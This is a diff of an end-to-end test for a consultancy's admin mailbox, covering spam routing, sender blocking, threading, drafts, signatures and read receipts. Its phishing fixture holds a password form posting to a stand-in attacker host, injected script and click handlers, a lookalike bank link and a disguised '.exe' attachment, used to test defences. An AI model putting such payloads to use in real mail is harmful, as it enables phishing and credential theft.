@@ -45,13 +45,14 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
    html:'<p onclick="steal()">Please note our change of bank details. <a href="https://evil.example/login">www.kudabank.com</a></p><script>alert(1)</script><form action="https://evil.example"><input name="pw"></form>',
    atts:[{name:'invoice.pdf.exe',type:'application/octet-stream',data:Buffer.from('MZ fake program')}]}))<300,'Worker accepts the phishing email (it never drops mail)');
  await sleep(2500);
- // Inbox
+ // Inbox: the genuine email; the impersonation went straight to Spam
  await a.goto(B+'/admin/mail');let body=await txt(a);
- ok(body.includes('My CAC documents')&&body.includes('Urgent: change of bank details'),'both emails are in the inbox');
- ok(/2 unread/.test(body),'unread count shows');
- ok(await a.locator('.bottom-nav a[href="/admin/mail"] .count').textContent()==='2','Mail badge on the navigation');
- ok(/Warning/.test(await a.locator('.mail-row:has-text("change of bank details")').textContent()),'phishing email is flagged in the list');
+ ok(body.includes('My CAC documents')&&!body.includes('Urgent: change of bank details'),'genuine email in the inbox, impersonation not');
+ ok(/1 unread/.test(body),'unread count shows');
+ ok(await a.locator('.bottom-nav a[href="/admin/mail"] .count').textContent()==='1','Mail badge on the navigation');
  ok(/Client/.test(await a.locator('.mail-row:has-text("My CAC documents")').textContent()),'client email is matched to the client');
+ await a.goto(B+'/admin/mail?f=spam');
+ ok(/Warning/.test(await a.locator('.mail-row:has-text("change of bank details")').textContent()),'impersonation is in Spam, flagged');
  // The phishing email
  await a.click('.mail-row:has-text("change of bank details")');await a.waitForLoadState();body=await txt(a);
  ok(body.includes('looks like ours but is not'),'warns about the lookalike domain');
@@ -68,9 +69,11 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
  ok((await a.getAttribute('iframe.mail-frame','sandbox'))==='allow-popups allow-popups-to-escape-sandbox','the frame itself is sandboxed');
  // Unsigned visitors cannot read it
  const anon=await fetch(B+`/admin/mail/${pid}/body`,{redirect:'manual'});ok(anon.status===303||anon.status===302||anon.status===401,'signed-out visitors cannot read emails');
- // Spam
- await a.click('button[value=spam]');await a.waitForLoadState();
- await a.goto(B+'/admin/mail?f=spam');ok((await txt(a)).includes('change of bank details'),'moved to Spam');
+ // Block the sender: their next email skips the inbox
+ await a.click('button[value=block]');await a.waitForLoadState();ok((await txt(a)).includes('Sender blocked'),'sender blocked');
+ await deliver('billing@awa1global.com.ng',eml({from:'billing@awa1global.com.ng',subject:'Second try',msgid:`<p2.${stamp}@awa1global.com.ng>`,auth:'mx.cloudflare.net; spf=pass; dkim=pass; dmarc=pass',html:'<p>hello</p>'}));
+ await sleep(2000);await a.goto(B+'/admin/mail');ok(!(await txt(a)).includes('Second try'),'blocked sender stays out of the inbox');
+ await a.goto(B+'/admin/mail?f=spam');ok((await txt(a)).includes('Second try'),'and lands in Spam');
  // The client email
  await a.goto(B+'/admin/mail');await a.click('.mail-row:has-text("My CAC documents")');await a.waitForLoadState();body=await txt(a);
  ok(body.includes('Sender verified (example.com)'),'genuine sender shows as verified');
@@ -92,13 +95,15 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
  ok((await a.inputValue('#m-body')).includes('> Good morning, please find my ID attached.'),'reply quotes the original');
  await a.fill('#m-body','Thank you Ngozi, received. We will file today.\n\n'+(await a.inputValue('#m-body')));
  await a.setInputFiles('#m-files',[{name:'checklist.pdf',mimeType:'application/pdf',buffer:pdf}]);
- await a.click('.mail-compose button[type=submit]');await a.waitForLoadState();body=await txt(a);
+ await a.waitForSelector('.att-chip:has-text("checklist.pdf")');
+ ok(/Saved in Drafts/.test(await a.textContent('.draft-status')),'reply is saved to Drafts while typing');
+ await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();body=await txt(a);
  const sent=emails().filter(e=>e.subject==='Re: My CAC documents').at(-1);
  ok(body.includes('Email sent.'),'reply sent');
  ok(sent&&sent.sender.email==='info@awalglobal.com.ng'&&sent.to[0].email===cEmail,'sent from info@ to the client');
  ok(sent&&sent.headers&&sent.headers['In-Reply-To']===m1&&sent.headers.References.includes(m1),'threading headers set');
  ok(sent&&sent.attachment.length===1&&sent.attachment[0].name==='checklist.pdf','attachment sent');
- ok(sent&&!/<script/i.test(sent.html)&&sent.html.includes('Thank you Ngozi'),'message body sent as clean HTML');
+ ok(sent&&!/<script/i.test(sent.html)&&sent.html.includes('Thank you Ngozi')&&sent.html.includes('logo-mark.png')&&sent.html.includes('Client Services'),'message body sent as clean HTML with the info@ signature');
  ok(await a.locator('.mail-msg').count()===2&&/Awal Global Consults <info@awalglobal\.com\.ng>/.test(body),'reply shows in the conversation');
  // The client answers our reply: it joins the same conversation
  await deliver(cEmail,eml({from:`Ngozi Okafor <${cEmail}>`,subject:'Re: Re: My CAC documents',msgid:`<m3.${stamp}@example.com>`,inReplyTo:sent.messageId,auth:'mx.cloudflare.net; spf=pass; dkim=pass; dmarc=pass',html:'<p>Thanks!</p>',text:'Thanks!'}));
@@ -106,12 +111,52 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
  ok(await a.locator('.mail-row:has-text("Ngozi")').count()===1&&/\(3\)/.test(await a.locator('.mail-row:has-text("Ngozi")').textContent()),'client reply threads into one conversation of 3');
  await a.click('.mail-row:has-text("Ngozi")');await a.waitForLoadState();
  ok((await a.frameLocator('iframe.mail-frame').last().locator('body').textContent({timeout:10000})).includes('Thanks!'),'email text shows inside the safe frame');
- // Unsafe attachment cannot be sent
+ // Unsafe attachment cannot be added
  await a.goto(B+'/admin/mail/new?to='+encodeURIComponent(cEmail));await a.fill('#m-subject','Test');await a.fill('#m-body','Hello');
- await a.setInputFiles('#m-files',[{name:'tool.exe',mimeType:'application/octet-stream',buffer:Buffer.from('MZ')}]);await a.click('.mail-compose button[type=submit]');await a.waitForLoadState();
- ok((await txt(a)).includes('can carry malware'),'program files cannot be sent');
- await a.setInputFiles('#m-files',[]);await a.fill('#m-to','not-an-email');await a.fill('#m-subject','Test');await a.fill('#m-body','Hello');await a.click('.mail-compose button[type=submit]');await a.waitForLoadState();
+ let dialogMsg='';a.once('dialog',d=>{dialogMsg=d.message();d.dismiss()});
+ await a.setInputFiles('#m-files',[{name:'tool.exe',mimeType:'application/octet-stream',buffer:Buffer.from('MZ')}]);await sleep(2500);
+ ok(/can carry malware/.test(dialogMsg)&&await a.locator('.att-chip').count()===0,'program files cannot be attached');
+ await a.fill('#m-to','not-an-email');await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();
  ok((await txt(a)).includes("don't look right"),'bad addresses refused');
+ // ── Sending as the founder, with his own signature
+ await a.goto(B+'/admin/mail/new');
+ const froms=await a.$$eval('#m-from option',o=>o.map(x=>x.value));
+ ok(froms.join()==='info@awalglobal.com.ng,contact@awalglobal.com.ng,abdullateef@awalglobal.com.ng','info@, contact@ and abdullateef@ to send from');
+ await a.selectOption('#m-from','abdullateef@awalglobal.com.ng');
+ ok((await a.textContent('.sig-preview')).includes('Abdullateef Olamilekan Abdulwaheed'),'signature switches with the sender');
+ await a.fill('#m-to',cEmail);await a.fill('#m-subject','A note from the founder '+stamp);await a.fill('#m-body','Dear Ngozi,\n\nThank you for choosing us.');
+ await a.click('.mail-compose button[type=submit]:has-text("Send")');await a.waitForLoadState();
+ const fsent=emails().filter(e=>e.subject==='A note from the founder '+stamp).at(-1);
+ ok(fsent&&fsent.sender.email==='abdullateef@awalglobal.com.ng'&&fsent.sender.name==='Abdullateef Olamilekan Abdulwaheed'&&fsent.replyTo.email==='abdullateef@awalglobal.com.ng','sent as the founder');
+ ok(fsent&&fsent.html.includes('Founder; Governance, Risk and Compliance')&&!fsent.html.includes('Client Services'),'with the founder signature');
+ // A reply goes out from the address the client wrote to
+ await fetch(`${W}/cdn-cgi/handler/email?from=${encodeURIComponent(cEmail)}&to=contact@awalglobal.com.ng`,{method:'POST',body:eml({from:cEmail,subject:'Enquiry to contact',msgid:`<c1.${stamp}@example.com>`,auth:'mx.cloudflare.net; spf=pass; dkim=pass; dmarc=pass',html:'<p>Hello contact</p>'}).replace('To: info@awalglobal.com.ng','To: contact@awalglobal.com.ng')});
+ await sleep(2000);await a.goto(B+'/admin/mail?box=contact%40awalglobal.com.ng');ok((await txt(a)).includes('Enquiry to contact')&&!(await txt(a)).includes('My CAC documents'),'filter by address');
+ await a.click('.mail-row:has-text("Enquiry to contact")');await a.click('a.btn:has-text("Reply")');await a.waitForLoadState();
+ ok(await a.inputValue('#m-from')==='contact@awalglobal.com.ng','reply is from contact@, where it was sent');
+ // ── Drafts follow you between devices
+ await a.goto(B+'/admin/mail/new');await a.fill('#m-to','partner@example.com');await a.fill('#m-subject','Draft on the phone '+stamp);await a.fill('#m-body','Half-written on my phone');
+ await a.waitForFunction(()=>/Saved in Drafts/.test(document.querySelector('.draft-status').textContent),null,{timeout:10000});
+ ok(/draft=/.test(a.url()),'draft gets its own link');
+ await a.setInputFiles('#m-files',[{name:'notes.pdf',mimeType:'application/pdf',buffer:pdf}]);await a.waitForSelector('.att-chip:has-text("notes.pdf")');
+ const web=await b.newContext({viewport:{width:1280,height:900},storageState:await a.context().storageState()});const p2=await web.newPage();
+ await p2.goto(B+'/admin/mail?f=drafts');ok((await txt(p2)).includes('Draft on the phone '+stamp),'draft listed in Drafts on another device');
+ await p2.click('.mail-row:has-text("Draft on the phone")');await p2.waitForLoadState();
+ ok(await p2.inputValue('#m-body')==='Half-written on my phone'&&await p2.locator('.att-chip:has-text("notes.pdf")').count()===1,'draft opens with its text and attachment on the web');
+ await p2.fill('#m-body','Finished on the computer');await p2.click('.mail-compose button[type=submit]:has-text("Send")');await p2.waitForLoadState();
+ const dsent=emails().filter(e=>e.subject==='Draft on the phone '+stamp).at(-1);
+ ok(dsent&&dsent.text.startsWith('Finished on the computer')&&dsent.attachment.length===1&&dsent.attachment[0].name==='notes.pdf','draft sent with its attachment');
+ await p2.goto(B+'/admin/mail?f=drafts');ok(!(await txt(p2)).includes('Draft on the phone '+stamp),'sent draft leaves Drafts');
+ await web.close();
+ // ── Delivered and read ticks
+ const tok=JSON.parse(execSync(`cd ${S} && ${process.cwd()}/tests/node_modules/.bin/wrangler d1 execute local-test --local -c wr.toml --persist-to wrstate --json --command "SELECT value FROM app_settings WHERE key='brevo_mail_webhook'"`).toString().replace(/^[^\[]*/,''))[0].results[0].value;
+ const hookUrl=B+'/hooks/brevo?k='+JSON.parse(tok).token;
+ await a.goto(B+'/admin/mail?f=sent');ok(await a.locator('.mail-row:has-text("A note from the founder") .tick-sent').count()===1,'one tick: sent');
+ await fetch(hookUrl,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({event:'delivered',email:cEmail,'message-id':fsent.messageId,date:'2026-11-20 10:00:00'})});
+ await a.reload();ok(await a.locator('.mail-row:has-text("A note from the founder") .tick-delivered').count()===1,'two grey ticks: delivered');
+ await fetch(hookUrl,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({event:'opened',email:cEmail,'message-id':fsent.messageId,date:'2026-11-20 10:05:00'})});
+ await a.reload();ok(await a.locator('.mail-row:has-text("A note from the founder") .tick-read').count()===1,'two blue ticks: read');
+ ok((await fetch(B+'/hooks/brevo?k=wrong',{method:'POST',body:'{}'})).status===403,'tick events need the secret token');
  // Trash and restore
  await a.goto(B+`/admin/mail/${mid}`);await a.click('button[value=trash]');await a.waitForLoadState();
  await a.goto(B+'/admin/mail?f=trash');ok((await txt(a)).includes('My CAC documents'),'deleted conversation is in Trash');
@@ -124,6 +169,9 @@ const deliver=async(from,raw)=>{const r=await fetch(`${W}/cdn-cgi/handler/email?
  const clientHref=await a.getAttribute('a[href^="/admin/client/"]','href');
  const ex=await a.evaluate(async u=>(await fetch(u)).json(),clientHref+'/export');ok(Array.isArray(ex.emails)&&ex.emails.length>=3,'client data export includes their emails');
  await a.screenshot({path:S+'/mail-thread.png',fullPage:true});
+ await a.goto(B+'/admin/mail?f=sent');await a.screenshot({path:S+'/mail-sent.png',fullPage:true});
+ await a.goto(B+'/admin/mail/new?from=abdullateef%40awalglobal.com.ng');await a.screenshot({path:S+'/mail-compose.png',fullPage:true});
+ await a.goto(B+'/admin/settings');await a.screenshot({path:S+'/settings.png',fullPage:true});
  await a.goto(B+'/admin/mail?f=spam');await a.click('.mail-row');await a.waitForLoadState();await a.screenshot({path:S+'/mail-phish.png',fullPage:true});
  } finally { await b.close(); w.kill(); }
 })().catch(e=>{console.log('ERR',e.message.split('\n')[0]);process.exit(1)});
